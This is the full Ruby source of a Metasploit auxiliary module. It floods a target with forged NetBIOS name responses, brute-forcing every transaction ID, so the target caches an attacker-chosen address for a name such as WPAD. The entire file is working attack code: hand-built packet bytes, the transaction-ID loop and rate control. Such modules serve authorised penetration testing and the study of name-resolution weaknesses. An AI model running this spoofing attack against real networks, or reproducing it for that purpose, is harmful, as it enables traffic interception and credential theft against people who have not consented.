##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp

  def initialize
    super(
      'Name'        => 'NetBIOS Response Brute Force Spoof (Direct)',
      'Description'    => %q{
          This module continuously spams NetBIOS responses to a target for given hostname,
        causing the target to cache a malicious address for this name. On high-speed local
        networks, the PPSRATE value should be increased to speed up this attack. As an
        example, a value of around 30,000 is almost 100% successful when spoofing a
        response for a 'WPAD' lookup. Distant targets may require more time and lower
        rates for a successful attack.
      },
      'Author'     => [
        'vvalien',   # Metasploit Module (post)
        'hdm',       # Metasploit Module
        'tombkeeper' # Related Work
      ],
      'License'     => MSF_LICENSE,
    )

    register_options(
      [
        Opt::RPORT(137),
        OptString.new('NBNAME',   [ true, "The NetBIOS name to spoof a reply for", 'WPAD' ]),
        OptAddress.new('NBADDR',  [ true, "The address that the NetBIOS name should resolve to", Rex::Socket.source_address("50.50.50.50") ]),
        OptInt.new('PPSRATE',     [ true, "The rate at which to send NetBIOS replies", 1_000])
      ],
      self.class
    )
  end

  def netbios_spam
    payload =
        "\xff\xff"   + # TX ID (will brute force this)
        "\x85\x00"   + # Flags = response + authoratative + recursion desired
        "\x00\x00"   + # Questions = 0
        "\x00\x01"   + # Answer RRs = 1
        "\x00\x00"   + # Authority RRs = 0
        "\x00\x00"   + # Additional RRs = 0
        "\x20"       +
        Rex::Proto::SMB::Utils.nbname_encode( [@fake_name.upcase].pack("A15") + "\x00" ) +
        "\x00"       +
        "\x00\x20"   + # Type = NB
        "\x00\x01"   + # Class = IN
        "\x00\x04\x93\xe0" + # TTL long time
        "\x00\x06"   + # Datalength = 6
        "\x00\x00"   + # Flags B-node, unique
        Rex::Socket.addr_aton(@fake_addr)

    stime = Time.now.to_f
    pcnt = 0
    pps  = 0

    print_status("Spamming NetBIOS responses for #{@fake_name}/#{@fake_addr} to #{@targ_addr}:#{@targ_port} at #{@targ_rate}/pps...")

    live = true
    while live
      0.upto(65535) do |txid|
        begin
          payload[0,2] = [txid].pack("n")
          @sock.put(payload)
          pcnt += 1

          pps = (pcnt / (Time.now.to_f - stime)).to_i
          if pps > @targ_rate
            sleep(0.01)
          end
        rescue Errno::ECONNREFUSED
          print_error("Error: Target sent us an ICMP port unreachable, port is likely closed")
          live = false
          break
        end
      end
    end

    print_status("Cleaning up...")
  end

  def run
    connect_udp
    @sock = self.udp_sock

    @targ_addr = rhost
    @targ_port = rport
    @targ_rate = datastore['PPSRATE']
    @fake_name = datastore['NBNAME']
    @fake_addr = datastore['NBADDR']

    netbios_spam

    disconnect_udp
  end
end
